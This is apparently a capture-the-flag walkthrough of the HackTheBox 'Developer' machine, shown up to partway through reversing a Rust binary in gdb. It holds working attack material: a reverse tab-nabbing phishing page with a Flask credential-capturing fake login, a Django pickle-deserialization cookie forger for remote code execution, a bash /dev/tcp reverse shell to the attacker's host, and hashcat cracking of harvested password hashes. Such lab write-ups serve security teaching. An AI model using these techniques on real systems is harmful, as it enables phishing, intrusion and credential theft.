The first five characters are `ITITI`, which could be a repeating two byte pattern of `IT`. It works:

![image-20210713170757864](https://0xdfimages.gitlab.io/img/image-20210713170757864.png)
**Flag: DHTB{XoringIsFun}**

#### Triple Whammy

The prompt gives three hex strings:

```

c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e
fb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b
7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f

```

And a Python script:

```

import os
from secret import flag

def bxor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

key1 = os.urandom(len(flag))
key2 = os.urandom(len(flag))

ct1 = bxor(key1, flag)
ct2 = bxor(ct1, key2)
ct3 = bxor(key2, flag)

print(ct1.hex())
print(ct2.hex())
print(ct3.hex())  

```

Because of how XOR works, this is easily exploitable. `ct2` is `key1 ^ key2 ^ flag`, and `ct3` is `key2 ^ flag`. So calculating `ct2 ^ ct3` will give `key1 ^ key2 ^ flag ^ key2 ^ flag`. But any time you xor something with the same thing twice, it ends up with the original. So that above is the same as `key1`. Knowing `key1`, then `key1 ^ ct1` will be the flag. It works:

```

oxdf@parrot$ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import binascii
>>> def bxor(ba1, ba2):
...     return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
... 
>>> ct1 = binascii.unhexlify("c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e")
>>> ct2 = binascii.unhexlify("fb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b")
>>> ct3 = binascii.unhexlify("7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f")
>>> key1 = bxor(ct2, ct3)
>>> flag = bxor(key1, ct1)
>>> print(flag.decode())
DHTB{XorXorXorFunFunFun}

```
**Flag: DHTB{XorXorXorFunFunFun}**

## Shell as www-data

### Reverse Tab-Nabbing Exploit

#### Theory

0xprashant found this neat [reverse tab-nabbing bug](https://0xprashant.in/posts/htb-bug/) in the HTB platform August 2020. When a web developer wants a link to open in a new tab, they add `target="_blank"` to the `<a>` tag. The issue is, if that link leads to a malicious page and mitigations aren’t in place, then JavaScript on that page can actually change the location of the original page. So this is really only an issue if you are linking to user-controlled content that the site doesn’t. The mitigation for this is to also add `rel="noopener nofollow"` to the `<a>` tag as well.

For example, the HackTheBox pages for retired machines show links to user writeups. Looking at the source on HTB for the link to my RopeTwo writeup, the mitigation is in place:

![image-20220113073246052](https://0xdfimages.gitlab.io/img/image-20220113073246052.png)

Looking at the profile links on Developer, the `rel` is missing, suggesting this link is vulnerable to tab-nabbing:

![image-20220113073356495](https://0xdfimages.gitlab.io/img/image-20220113073356495.png)

#### Strategy

The goal here will be to host a page so that when the admin clicks on the link, it open in a new tab that’s now visible. The JavaScript in that tab will reverse tab-nab the original tab to send it to another page I’m hosting that looks like the login page for Developer. When the admin is done reading my page and comes back, they’ll think they’ve been logged out for some reason, and log in again, where I capture the creds.

#### Generate Tab-Nabber

I’ll grab the tab nabber page from the 0xprashant post and edit it to point to the login path on my host:

```

<html>
  <body>
    <h2>Challenge Writeup</h2>
    <p>This challenge was quite well designed! Good job by the developers at Developer for this one. I would definitely recommend it to my friends. It required critical thinking and tools like Ghidra to get the job done</p>
    <script>
    if (window.opener) window.opener.parent.location.replace('http://10.10.14.6/accounts/login/');
    if (window.parent != window) window.parent.location.replace('https://10.10.14.6/accounts/login/');           
    </script>
  </body>
</html>

```

I also added a silly generic writeup to give the admin something to read.

#### Generate Login / Server

I’ll grab the source from the login page and save it as `loginform.html`. The HTML form `action` points to `/accounts/login/`, Now I’ll write a quick Flask server to handle both the writeup and the fake login:

```

#!/usr/bin/env python3

from flask import *

app = Flask(__name__, template_folder='.')

@app.route("/writeup")
def writeup():
    return render_template('writeup.html')

@app.route("/accounts/login/", methods=['GET', 'POST'])
def login():

    if request.method == 'POST':
        print('\n'.join([f'{x[0]}: {x[1]}' for x in request.form.items()]))
        return redirect("http://10.10.10.120/accounts/login/", code=302)
    else:
        return render_template('loginform.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)

```

Requests to `/writeup` will return the tab nabber page. For `/accounts/login/`, if it’s a GET request, it will return the static page I saved. If it is a POST, it will print the form data and then return a redirect back to the legit site. I’ll run the site with `python3 fake_login.py`, and the webserver listens on 80:

```

oxdf@parrot$ python fake_login.py 
 * Serving Flask app "fake_login" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://127.0.0.1:80/ (Press CTRL+C to quit)

```

Just loading the page myself, I noticed that the CSS and images are off, and there’s a bunch of 404s at Flask:

```
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /accounts/login/ HTTP/1.1" 200 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /static/css/jquery.toasts.css HTTP/1.1" 404 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /static/css/signin.css HTTP/1.1" 404 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /static/img/logo.png HTTP/1.1" 404 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /static/js/jquery.toast.js HTTP/1.1" 404 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /static/css/signin.css HTTP/1.1" 404 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /static/img/logo.png HTTP/1.1" 404 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /static/js/jquery.toast.js HTTP/1.1" 404 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /img/favicon.ico HTTP/1.1" 404 -

```

The links in `loginform.html` are all relative. This is not necessary to proceed (it will work without CSS), but of course I’d like to fix it. I could download those files, but I’ll edit the HTML to point back at Developer (final file [here](/files/developer-loginform.html.txt)). Now the page looks great:

![image-20210714062827307](https://0xdfimages.gitlab.io/img/image-20210714062827307.png)

Now I can submit `http://10.10.14.6/writeup` as a writeup, and it shows up on my profile for a second, and then there’s a request at flask:

```
10.10.10.120 - - [15/Jul/2021 14:06:20] "GET /writeup HTTP/1.1" 200 -
10.10.10.120 - - [15/Jul/2021 14:06:20] "GET /favicon.ico HTTP/1.1" 404 -
10.10.10.120 - - [15/Jul/2021 14:06:20] "GET /accounts/login/ HTTP/1.1" 200 -
10.10.10.120 - - [15/Jul/2021 14:06:21] "GET /img/favicon.ico HTTP/1.1" 404 -
10.10.10.120 - - [15/Jul/2021 14:06:21] "POST /accounts/login HTTP/1.1" 308 -
csrfmiddlewaretoken: Example1
login: admin
password: SuperSecurePassword@HTB2021
10.10.10.120 - - [15/Jul/2021 14:06:21] "POST /accounts/login/ HTTP/1.1" 302 -
10.10.10.120 - - [15/Jul/2021 14:06:22] "GET /accounts/login/ HTTP/1.1" 200 -

```

I’ve got the password for the admin.

### Django Deserialization

#### Identify Sentry

I’ll log out and back in as admin using the password “SuperSecurePassword@HTB2021”. There’s not much exciting on the main site, but going to `/admin` gives the Django administration page:

[![image-20210714153542986](https://0xdfimages.gitlab.io/img/image-20210714153542986.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210714153542986.png)

At the top I’ll note the admin’s name is jacob. The Sites section shows two sites:

![image-20210714154110747](https://0xdfimages.gitlab.io/img/image-20210714154110747.png)

I’ll add them both to my `/etc/hosts` file, and check out the new site:

![image-20210714154311564](https://0xdfimages.gitlab.io/img/image-20210714154311564.png)

I’m able to create an account and log in, but there’s nothing much I can do. The creds from earlier work with the account name jacob@developer.htb, and this provided admin access to Sentry:

![image-20210714154551274](https://0xdfimages.gitlab.io/img/image-20210714154551274.png)

#### Get Secret

After much looking around, I created a project by clicking on the new project button on the top of the page. I tried some things, but nothing provided much use. Trying to clean up after myself, I went to delete the project from the Project Settings, and it loaded this page:

![image-20210714154941021](https://0xdfimages.gitlab.io/img/image-20210714154941021.png)

When I click Remove Project, the page crashes with a ton of debug information:

[![image-20210714154900857](https://0xdfimages.gitlab.io/img/image-20210714154900857.png)](https://0xdfimages.gitlab.io/img/image-20210714154900857.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210714154900857.png)

It’s not clear why this crashes, but it turns out this is the case on a default installation. There’s some really useful information in there:

```

SENTRY_OPTIONS 	

{'cache.backend': 'sentry.cache.redis.RedisCache',
 'cache.options': {},
 'redis.options': {'hosts': {0: {'host': '127.0.0.1',
                                 'password': 'g7dRAO6BjTXMtP3iXGJjrSkz2H9Zhm0CAp2BnXE8h92AOWsPZ2zvtAapzrP8sqPR92aWN9DA207XmUTe',
                                 'port': 6379}}},
 'system.databases': {'default': {'ATOMIC_REQUESTS': False,
                                  'AUTOCOMMIT': True,
                                  'CONN_MAX_AGE': 0,
                                  'ENGINE': 'sentry.db.postgres',
                                  'HOST': 'localhost',
                                  'NAME': 'sentry',
                                  'OPTIONS': {},
                                  'PASSWORD': u'********************',
                                  'PORT': '',
                                  'TEST_CHARSET': None,
                                  'TEST_COLLATION': None,
                                  'TEST_MIRROR': None,
                                  'TEST_NAME': None,
                                  'TIME_ZONE': 'UTC',
                                  'USER': 'sentry'}},
 'system.debug': True,
 'system.secret-key': 'c7f3a64aa184b7cbb1a7cbe9cd544913'}

```

`system.secret-key` is the Django secret.

#### Exploit

Googling for “Django secret rce”, the first links is to a post about [getting RCE on Facebook](https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/). The author managed to crash one of their servers, and leak the secret just like I did above. There’s a simple POC script in the post:

```

#!/usr/bin/python
import django.core.signing, django.contrib.sessions.serializers
from django.http import HttpResponse
import cPickle
import os

SECRET_KEY='[RETRIEVEDKEY]'
#Initial cookie I had on sentry when trying to reset a password
cookie='gAJ9cQFYCgAAAHRlc3Rjb29raWVxAlgGAAAAd29ya2VkcQNzLg:1fjsBy:FdZ8oz3sQBnx2TPyncNt0LoyiAw'
newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
class PickleRce(object):
    def __reduce__(self):
        return (os.system,("sleep 30",))
newContent['testcookie'] = PickleRce()

print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)

```

I started by trying to convert this to python3 by replacing `cPickle` with `pickle` and fixing the print. It worked, but the cookie didn’t work. Because serialization is different between the two, I dropped to Python2 (it was a bit of a pain to get `pip2` to install `django`, a solution is in a comment on [this stack overflow post](https://stackoverflow.com/questions/64187581/e-package-python-pip-has-no-installation-candidate)).

In the Sentry panel from Firefox, I’ll look into the dev tools and grab the `sentrysid` cookie, and add it to the `cookie` variable in the script. I’ll also add the key. Running this prints a new cookie:

```

oxdf@parrot$ python2 django-rce.py 'sleep 30'
Forged cookie:
.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABChQEFyZaljmblJv7-kRwAQVKUotLkvPzszNTkwvyizMruIori0tSc7kKmUI5inNSUwsUjA0KmVuDCllCeeMTS0sy4kuLU4viM1O8WUOFkASSEpOzU_NSQpUgVuqVlmTmFOuB5PVccxMzcxyBLCeImlI9AMvDOmg:1m47Ab:qtESKz_ys02L-8eRSb5mxPZQFgA

```

Replacing the `sentrysid` cookie with the output and refreshing, the page hangs for 30 seconds, and then returns an error. That’s RCE.

I upgraded the script a bit to take a command from the command line and to submit the cookie for me to save copy and pasting:

```

#!/usr/bin/python2
import django.core.signing, django.contrib.sessions.serializers
from django.http import HttpResponse
import cPickle
import os
import requests
import sys

cmd = sys.argv[1]

SECRET_KEY='c7f3a64aa184b7cbb1a7cbe9cd544913'
#Initial cookie I had on sentry when trying to reset a password
cookie=".eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABChQEFyZaljmblJv7-hQyRXABhUpSi0uS8_OzM1PBWsrzi7JTU0KF4hNLSzLiS4tTi-KTEpOzU_NSQpUgxumVlmTmFOuB5PVccxMzcxyBLCeoGl4kfZkp3qylegCrOjNK:1m45xH:Zcs2GcAl2Knls_STRUkB22PKJlg"
newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')                              
class PickleRce(object):
    def __reduce__(self):
        return (os.system,(cmd,))
newContent['testcookie'] = PickleRce()

cookie = django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)                 
print("Forged cookie:\n" + cookie)

requests.get("http://developer-sentry.developer.htb/sentry/", cookies={"sentrysid": cookie})   

```

For example, with `tcpdump` listening, I can ping myself:

```

oxdf@parrot$ python2 django-rce.py 'ping -c 1 10.10.14.6'
Forged cookie:
.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABChQEFyZaljmblJv7-kRwAQVKUotLkvPzszNTkwvyizMruIori0tSc7kKmUJFCjLz0hV0kxUMFQwN9EDIRM-skLk1qJAllDc-sbQkI760OLUoPjPFmzVUCEkgKTE5OzUvJVQJYr1eaUlmTrEeSF7PNTcxM8cRyHKCqCnVAwDdijyO:1m47EC:va8S4KQZMhdYvXCdcgRVBkjPoIQ

```

And see it at `tcpdump`:

```

oxdf@parrot$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:41:00.834421 IP developer.htb > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
15:41:00.834453 IP 10.10.14.6 > developer.htb: ICMP echo reply, id 2, seq 1, length 64

```

#### Shell

Running this with a reverse shell payload returned a shell:

```

oxdf@parrot$ python2 django-rce.py 'bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'
Forged cookie:
.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABChQEFyZaljmblJv7-kRwAQVKUotLkvPzszNTkwvyizMruIori0tSc7kKmUINkxKLMxR0kxWUIIxMBTs1Bf2U1DL9kuQCfUMDPRAy0TPTNzExVjCwUzNUKmRuDSpkCeWNTywtyYgvLU4tis9M8WYNFUISSEpMzk7NSwlVgrhNr7QkM6dYDySv55qbmJnjCGQ5QdSU6gEAY4JESA:1m478z:q3TGSOBo-rDA954yJoX08RfEI9g

```

At a listening `nc`:

```

oxdf@parrot$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.120] 40458
bash: cannot set terminal process group (879): Inappropriate ioctl for device
bash: no job control in this shell
www-data@developer:/var/sentry$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll upgrade the shell with the standard trick:

```

www-data@developer:/var/sentry$ python -c 'import pty;pty.spawn("bash")'
python -c 'import pty;pty.spawn("bash")'
www-data@developer:/var/sentry$ ^Z
[1]+  Stopped                 nc -lvnp 443
oxdf@parrot$ stty raw -echo ; fg
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@developer:/var/sentry$ 

```

## Shell as karl

### Enumeration

#### Homedirs

There are two user home directories:

```

www-data@developer:/home$ ls
karl  mark

```

As www-data, I can’t access either:

```

www-data@developer:/home$ cd karl/
bash: cd: karl/: Permission denied
www-data@developer:/home$ cd mark/
bash: cd: mark/: Permission denied

```

#### PostGres

In `/var/www/developer_ctf/` is the Django project:

```

www-data@developer:~/developer_ctf$ ls
challenge_downloads  challenges  developer_ctf  developerenv  manage.py  profiles  static

```

`developer_ctf` holds the settings for the project. `profiles` and `challenges` are two custom apps. `challenge_downloads` and `static` are static files, and `developerenv` is a virtual environment to make easier the integration with Apache / `mod_uwsgi`.

In `developer_ctf/settings.py`, there’s the DB config:

```

DATABASES = {
    'default': {       
        'ENGINE': 'django.db.backends.postgresql',
        'NAME': 'platform',
        'USER': 'ctf_admin',
        'PASSWORD': 'CTFOG2021',               
        'HOST': 'localhost',
        'PORT': '',
    }                  
}      

```

It’s a Postgres DB, and that’s everything needed to connect:

```

www-data@developer:~/developer_ctf$ psql postgresql://ctf_admin:CTFOG2021@localhost:5432/platform
psql (9.6.22)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

platform=>

```

The instance has five databases:

```

platform=> \list
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
-----------+----------+----------+-------------+-------------+-----------------------
 platform  | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 | 
 postgres  | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 | 
 sentry    | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 | 
 template0 | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_GB.UTF-8 | en_GB.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
(5 rows)

```

The `platform` DB has 21 tables:

```

platform=> \dt
                        List of relations
 Schema |                Name                | Type  |   Owner   
--------+------------------------------------+-------+-----------
 public | account_emailaddress               | table | ctf_admin
 public | account_emailconfirmation          | table | ctf_admin
 public | auth_group                         | table | ctf_admin
 public | auth_group_permissions             | table | ctf_admin
 public | auth_permission                    | table | ctf_admin
 public | auth_user                          | table | ctf_admin
 public | auth_user_groups                   | table | ctf_admin
 public | auth_user_user_permissions         | table | ctf_admin
 public | challenges_challenge               | table | ctf_admin
 public | challenges_challenge_solved        | table | ctf_admin
 public | django_admin_log                   | table | ctf_admin
 public | django_content_type                | table | ctf_admin
 public | django_migrations                  | table | ctf_admin
 public | django_session                     | table | ctf_admin
 public | django_site                        | table | ctf_admin
 public | profiles_profile                   | table | ctf_admin
 public | profiles_profile_solved_challenges | table | ctf_admin
 public | socialaccount_socialaccount        | table | ctf_admin
 public | socialaccount_socialapp            | table | ctf_admin
 public | socialaccount_socialapp_sites      | table | ctf_admin
 public | socialaccount_socialtoken          | table | ctf_admin
(21 rows)

```

`auth_user` is where Django stores the users:

```

platform=> select id,username,password,is_superuser from auth_user;
 id |   username   |                                         password                                         | is_superuser 
----+--------------+------------------------------------------------------------------------------------------+--------------
  6 | TheCyberGeek | pbkdf2_sha256$260000$vNMDolsiNtr0ZaLLprGPUC$yR80hZuHmIACTj1a5ZOvhL9+zeceotAlI9lVqRpQGfc= | f
  5 | clubby789    | pbkdf2_sha256$260000$FyKNWfAl4Z87o55I4bDST7$7PrVwU5N1687BSxClTP0tlnFg+9VmOR6lsXiJsSRBNE= | f
  2 | willwam845   | pbkdf2_sha256$260000$7Pu55SdoDNTu51RrtU5V8A$Fmn66ovbOqfNUKftQYrJcWmk7xzejU0g3F72jL+cdUg= | f
  3 | dmw0ng       | pbkdf2_sha256$260000$k0RbpkHl5CvArYIwsGxFUb$ixe4YKYn45Fm8aq56GEzF8TUi9lydD2WA2gRxXz/EMc= | f
  4 | jazzpizazz   | pbkdf2_sha256$260000$aFEnXsRKf4YRRUw1qnlJSN$4oL+FVJpqmi4sCt4U9ddPRE1srKZiP+HCXInnCuzdv0= | f
  7 | 0xdff        | pbkdf2_sha256$260000$jbMz3no7lHqvQSiF0O1xo3$pLDuNAcCGv4jky29NGfEfuDNRigk/H/GAt1jSfQsCxo= | f
  1 | admin        | pbkdf2_sha256$260000$H7w2AZzBGAHHHvSzgQZXHf$TWkQdxmDHXDxoWLSEQYjZQbMJJjMpzmEHBqWMNHr0xc= | t
(7 rows)

```

I didn’t find much else of interest in here.

The `sentry` DB has 60 tables:

```

sentry=> \dt                                                                                             
WARNING: terminal is not fully functional                                                                
                      List of relations    
 Schema |               Name                | Type  | Owner  
--------+-----------------------------------+-------+--------
 public | auth_group                        | table | sentry
 public | auth_group_permissions            | table | sentry 
 public | auth_permission                   | table | sentry
 public | auth_user                         | table | sentry
 public | django_admin_log                  | table | sentry
 public | django_content_type               | table | sentry
 public | django_session                    | table | sentry
...[snip]...
 public | sentry_useroption                 | table | sentry
 public | sentry_userreport                 | table | sentry
 public | social_auth_association           | table | sentry
 public | social_auth_nonce                 | table | sentry
 public | social_auth_usersocialauth        | table | sentry
 public | south_migrationhistory            | table | sentry
(60 rows)

```

I tried to read the `auth_user` table, but this user doesn’t have permissions:

```

sentry=> select id,username,password,is_superuser from auth_user;
ERROR:  permission denied for relation auth_user

```

Looking in `/etc`, there’s a config file for Sentry at `/etc/sentry/sentry.conf.py`, and it has connection information for a different user:

```

...[snip]...
DATABASES = {                                       
    'default': {
        'ENGINE': 'sentry.db.postgres',
        'NAME': 'sentry',                           
        'USER': 'sentry',
        'PASSWORD': 'SentryPassword2021',
        'HOST': 'localhost',
        'PORT': '',
    }     
}
...[snip]...

```

On connecting, judging by the prompt this user is elevated:

```

www-data@developer:/etc/sentry$ psql postgresql://sentry:SentryPassword2021@localhost:5432/sentry  
psql (9.6.22)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

sentry=#

```

There are two users:

```

sentry=# select id,username,password,is_superuser from auth_user;
 id |      username       |                                   password                                    | is_superuser 
----+---------------------+-------------------------------------------------------------------------------+--------------
  1 | karl@developer.htb  | pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI= | t
  5 | jacob@developer.htb | pbkdf2_sha256$12000$MqrMlEjmKEQD$MeYgWqZffc6tBixWGwXX2NTf/0jIG42ofI+W3vcUKts= | t
(2 rows)

```

I already have the password for jacob, but karl is one of the users on the box!

### Crack Hashes

The hash for karl matches the format of [Hashcat mode](https://hashcat.net/wiki/doku.php?id=example_hashes) 10000, “Django (PBKDF2-SHA256)”. It cracks in about a minute giving a password of “insaneclownposse”:

```

$ hashcat -m 10000 karl.hash /usr/share/wordlists/rockyou.txt 
...[snip]...
pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=:insaneclownposse

```

### SSH

That password actually works for karl over SSH:

```

oxdf@parrot$ sshpass -p insaneclownposse ssh karl@10.10.11.103
...[snip]...
karl@developer:~$

```

And I can get the user flag:

```

karl@developer:~$ cat user.txt
700c0e85************************

```

## Shell as root

### Enumeration

karl can run a binary named `authenticator` as root with `sudo`:

```

karl@developer:~$ sudo -l
[sudo] password for karl: 
Matching Defaults entries for karl on developer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karl may run the following commands on developer:
    (ALL : ALL) /root/.auth/authenticator

```

I can’t read in `/root`, but I can access that directory. That’s the only file in that directory:

```

karl@developer:~$ ls -l /root/
ls: cannot open directory '/root/': Permission denied
karl@developer:~$ ls -l /root/.auth
total 10408
-rwxr-xr-x 1 root root 10654632 May 26  2021 authenticator
karl@developer:~$ ls -ld /root/.auth
drwxr-xr-x 2 root karl 4096 May 26  2021 /root/.auth

```

I was thinking it might be something related to 2FA, but running shows it’s custom for Developer:

```

karl@developer:~$ /root/.auth/authenticator 
Welcome to TheCyberGeek's super secure login portal!
Enter your password to access the super user: 
0xdfpassword
You entered a wrong password!

```

### RE

I’ll copy the binary to my VM with `scp`:

```

oxdf@parrot$ sshpass -p insaneclownposse scp karl@10.10.10.120:/root/.auth/authenticator .

```

Starting with `strings -n 10 authenticator` to get some clues about what’s going on. One that was particularly interesting:

```

Invalid AES key size./root/.cargo/registry/src/github.com-1ecc6299db9ec823/rust-crypto-0.2.36/src/aessafe.rs/root/.cargo/registry/src/github.com-1ecc6299db9ec823/rust-crypto-0.2.36/src/buffer.rs

```

The binary is using AES crypto. It’s also clear it is written in Rust (from the `.rs` extension, as well as many other clues in `strings` output).

[Rust](https://www.rust-lang.org/) is very big on preventing the user from making exploitable errors, and thus the compiler adds in a ton of checks to catch and handle any overflows, which is nice for the developer, but a pain for someone reversing it. Neither free IDA nor Ghidra do very well with Rust, so I’ll use both to see what I can find.

Rust seems to use a stub `main` function to load the actual user created main. In Ghidra, the main function looks super simple. But clicking `lang_start_internal()` will take you into a library function, not the user created code. Rather, in the Listing window there’s an address labeled `authentication::main` (which doesn’t show up in the functions list, but in the namespaces functions, just like in the Authentication CTF challenge, see the [video](https://www.youtube.com/watch?v=YrxFXvdtyDo?t=217) from the challenge above) that’s loaded into RAX and then put on the stack. That’s what I’m looking for:

![image-20210716064112741](https://0xdfimages.gitlab.io/img/image-20210716064112741.png)

IDA is similar:

![image-20210716064213398](https://0xdfimages.gitlab.io/img/image-20210716064213398.png)

It does show up in the function list:

![image-20210716064250143](https://0xdfimages.gitlab.io/img/image-20210716064250143.png)

Because the Rust output is so confusing, I’ll do a lot of looking at something, getting it’s address, going to `gdb`, breaking there, and looking at the passed args. It’s useful to know the offset between the addresses Ghidra/IDA show and what’s in memory with `gdb` after PIE moves things around. So I’ll check the `main` stub.

Ghidra:

![image-20210716070441218](https://0xdfimages.gitlab.io/img/image-20210716070441218.png)

IDA:

![image-20210716070513512](https://0xdfimages.gitlab.io/img/image-20210716070513512.png)

In Ghidra it is at 0x107fd0, and IDA 0x7fd0. In `gdb` if I put a break at main, it seems to match:

```

gdb-peda$ b main
Breakpoint 1 at 0x7fd0

```

But on running the program, it PIE will change the all but the low three nibbles:

```

gdb-peda$ r
Starting program: /media/sf_CTFs/hackthebox/developer-10.10.10.120/authenticator 
...[snip]...
Breakpoint 1, 0x000055555555bfd0 in main ()

```

As long as I don’t exit `gdb`, the top will stay the same, and I can just update the low four nibbles (and for a small program, the forth on doesn’t change much).

At the top of the `authentication::main`, it is printing and then reading from STDIN into a buffer I’ve named `user_input`:

![image-20220113172038839](https://0xdfimages.gitlab.io/img/image-20220113172038839.png)

A bit later, there’s a bunch of constants saved into two variables I’ve named `key` and `iv`, before a call to `crypto::aes::ctr` with those blocks being passed in:

![image-20220113172512783](https://0xdfimages.gitlab.io/img/image-20220113172512783.png)

I think the decompile isn’t great here, as the returned object, `msg` is not used again. But later, I believe it is used to make this call:

![image-20220113172653572](https://0xdfimages.gitlab.io/img/image-20220113172653572.png)

The encrypted result will be saved into the variable I named `enc_user_input`, which is then compared against the `enc_pass_correct` bytes that were set on the stack just before the crypto operations started.

![image-20220113172803944](https://0xdfimages.gitlab.io/img/image-20220113172803944.png)

There’s a ton of stuff after the `||` in that if, but practically, it’s checking if the encrypted output is 0x20 = 32 bytes long, and if it matches the hardcoded bytes.

It looks like it’s taking my input, encrypting it with a static key and IV, and then comparing it to some bytes. That means that I can decrypt those bytes to see what the plaintext password should be. And with the key, IV, and encrypted bytes, I have all I need to do that.

I could also find the same bits of information looking in `gdb` as well. The first call to `crypto::aes::ctr` is at 0x107936 in Ghida:

![image-20210716092356180](https://0xdfimages.gitlab.io/img/image-20210716092356180.png)

The other interesting one is at 0x1079a6:

![image-20210716092431989](https://0xdfimages.gitlab.io/img/image-20210716092431989.png)

I’ll add those breaks in `gdb`, disable the break at main, and run. It reaches user input:

```

gdb-peda$ b *0x000055555555b936
Breakpoint 2 at 0x55555555b936
gdb-peda$ b *0x000055555555b9a6
Breakpoint 3 at 0x55555555b9a6
gdb-peda$ dis 1
gdb-peda$ r
Starting program: /media/sf_CTFs/hackthebox/developer-10.10.10.120/authenticator 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to TheCyberGeek's super secure login portal!
Enter your password to access the super user: 

```

I’ll enter “0xdfpassword” and it runs to the first crypto breakpoint:

```

[----------------------------------registers-----------------------------------]
RAX: 0x5555555b7b70 --> 0xca976a80f0251bfe 
RBX: 0x555555586fc0 (<_ZN3std2io5stdio6_print17he89a42df6ab3cf66E>:     push   r15)
RCX: 0x7fffffffdb20 --> 0x9a95d2d9e3591f76 
RDX: 0x10 
RSI: 0x7fffffffdb10 --> 0x6191795c3432e8a3 
RDI: 0x0 
RBP: 0x55555559d850 (<__libc_csu_init>: push   r15)
RSP: 0x7fffffffd9b0 --> 0x0 
RIP: 0x55555555b936 (<_ZN14authentication4main17h453271f02403abafE+406>:        call   QWORD PTR [rip+0x580b4]        # 0x5555555b39f0)
R8 : 0x10 
R9 : 0x7ffff7f84be0 --> 0x5555555b7b90 --> 0x0 
R10: 0x8080808080808080 
R11: 0x30 ('0')
R12: 0x55555559e050 ("assertion failed: self.is_char_boundary(new_len)/usr/src/rustc-1.48.0/library/alloc/src/string.rsYou have successfully authenticated\nEnter your SSH public key in now:\nFailed to read input!src/main.rse"...)
R13: 0x0 
R14: 0x5555555b0920 --> 0x55555555b220 (<_ZN4core3ptr13drop_in_place17h63c710b71ecc8310E.llvm.10046553308101135558>:    ret)
R15: 0x5555555b7b70 --> 0xca976a80f0251bfe
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x55555555b926 <_ZN14authentication4main17h453271f02403abafE+390>:   mov    edx,0x10
   0x55555555b92b <_ZN14authentication4main17h453271f02403abafE+395>:   mov    r8d,0x10
   0x55555555b931 <_ZN14authentication4main17h453271f02403abafE+401>:   mov    edi,0x0
=> 0x55555555b936 <_ZN14authentication4main17h453271f02403abafE+406>:   call   QWORD PTR [rip+0x580b4]        # 0x5555555b39f0
   0x55555555b93c <_ZN14authentication4main17h453271f02403abafE+412>:   mov    QWORD PTR [rsp],rax
